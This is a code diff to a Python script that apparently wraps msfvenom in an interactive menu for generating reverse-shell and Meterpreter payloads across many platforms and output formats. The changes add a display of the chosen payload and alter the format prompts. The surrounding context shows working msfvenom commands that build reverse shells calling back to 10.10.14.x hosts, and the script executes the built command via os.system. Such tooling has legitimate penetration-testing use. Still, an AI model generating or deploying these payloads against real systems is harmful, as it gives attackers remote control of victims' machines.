@@ -78,6 +78,8 @@ exit_mode = ""
 exp_format =""
 pay_name =""
 command=""
+payload_used=""
+
 '''
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.13 lport=1234 -f aspx -o shell.aspx
 command :  msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=5555 -f war -o shell2.war
@@ -101,6 +103,7 @@ def show_banner():
     global exit_mode
     global exp_format
     global pay_name  
+    global payload_used
 
 
     os.system("clear")
@@ -120,7 +123,8 @@ def show_banner():
 
 ==> CURRENT OPTIONS:
 [================================================]
-[-] SHELL TYPE      :  \033[1;4m {shell_type} \033[0m                               
+[-] SHELL TYPE      :  \033[1;4m {shell_type} \033[0m
+[-] PAYLOAD USED    :  \033[1;4m {payload_used} \033[0m                              
 [-] PLATFORM        :  \033[1;4m {platform} \033[0m                                  
 [-] LHOST           :  \033[1;4m {lhost} \033[0m                                     
 [-] LPORT           :  \033[1;4m {lport} \033[0m                                    
@@ -135,17 +139,21 @@ def show_banner():
 
 def PayGen(shell,platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name): 
     global command
+    global payload_used
     reverse_shell= {"aix" : "aix/ppc/shell_reverse_tcp" ,"apple" : "apple_ios/aarch64/shell_reverse_tcp" ,"bsd" :"bsd/x86/shell_reverse_tcp" ,"bsdi" :"bsdi/x86/shell_reverse_tcp","cmd" :"cmd/windows/powershell_reverse_tcp","firefox" :"firefox/shell_reverse_tcp","generic" :"generic/shell_reverse_tcp","java" :"java/shell_reverse_tcp","linux" :"linux/x86/shell_reverse_tcp","mainframe" :"mainframe/shell_reverse_tcp","nodejs" :"nodejs/shell_reverse_tcp","osx" :"osx/x86/shell_reverse_tcp","python" :"python/shell_reverse_tcp","r" :"r/shell_reverse_tcp","ruby" :"ruby/shell_reverse_tcp","solaris" :"solaris/x86/shell_reverse_tcp","windows" :"windows/shell_reverse_tcp"}
     meterpreter_shell = {"android" : "android/meterpreter/reverse_tcp","java" : "java/meterpreter/reverse_tcp","linux" : "linux/x86/meterpreter/reverse_tcp","osx" : "osx/x64/meterpreter/reverse_tcp","php" : "php/meterpreter/reverse_tcp","python" : "python/meterpreter/reverse_tcp","windows" : "windows/meterpreter/reverse_tcp"}
     
     def rev_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name):
         global command
+        global payload_used
         command = "msfvenom " + "-p " + reverse_shell[platform] + " --platform " + platform + " lhost=" +lhost+ " lport=" + lport 
+        payload_used = reverse_shell[platform]
 
     def met_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name):
         global command
+        global payload_used
         command = "msfvenom " + "-p " + meterpreter_shell[platform] + " --platform " + platform + " lhost=" +lhost+ " lport=" + lport     
-    
+        payload_used = meterpreter_shell[platform]
     
     #print(f"{shell},{platform},{lhost}, {lport} , {encoder} , {arch} , {bad_chars}, {exit_mode}, {exp_format}, {pay_name}")
 
@@ -154,6 +162,7 @@ def PayGen(shell,platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_forma
     elif shell =='2':
         met_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name)
 
+    show_banner()
     # adding encoder
     if encoder != "N/A":
         command += " -e " + encoder
@@ -180,7 +189,7 @@ def PayGen(shell,platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_forma
     print("\033[30;42;5m [#] GENERATED COMMAND \033[m : " + command)
     print("\n [~] BUILDING .......... \n")
     os.system(command)
-    print("\n\033[30;42;5m [#] GENERATED PAYLOAD  \033[m  : " + "\033[30;42;5m " + pay_name + " \033[m")
+    print("\n\033[30;42;5m [#] GENERATED PAYLOAD  \033[m  : " + "\033[30;42;5m " + pay_name + " \033[m \n\n")
 
     
 
@@ -293,7 +302,7 @@ def main():
     # Export format
     eformats=["asp","aspx","aspx-exe","axis2","dll","elf","elf-so","exe","exe-only","exe-service","exe-small","hta-psh","jar","jsp","loop-vbs","macho","msi","msi-nouac","osx-app","psh","psh-cmd","psh-net","psh-reflection","python-reflection","vba","vba-exe","vba-psh","vbs","war"]
     tformats=["base32","base64","bash","c","csharp","dw","dword","hex","java","js_be","js_le","num","perl","pl","powershell","ps1","py","python","raw","rb","ruby","sh","vbapplication","vbscript"]
-    inp = input("[*] WHAT DO YOU WANT THE EXPORT TO BE EXECUTABLE OR TRANSFORM (E/T) : ").lower()
+    inp = input("[*] WHAT DO YOU WANT THE EXPORT TO BE EXECUTABLE OR TRANSFORM (E (DEFAULT) /T) : ").lower()
     if inp=="e" or inp =="executable":
         print(executable_formats)
         inp = int(input("[*] SELECT THE EXECUTABLE FORMAT :  ")) 
@@ -306,8 +315,10 @@ def main():
         ft = tformats[inp-1]
         exp_format = "transform : " + ft
     else:
-        input("[!] INVALID FORMAT !! .. SELECT AN APPROPRIATE FORMAT ! <PRESS ENTER>")
-        exit()
+        print(executable_formats)
+        inp = int(input("[*] SELECT THE EXECUTABLE FORMAT :  ")) 
+        ft = eformats[inp-1]
+        exp_format = "executable : " + ft
     show_banner()
     # ---------------------------------------------------
 
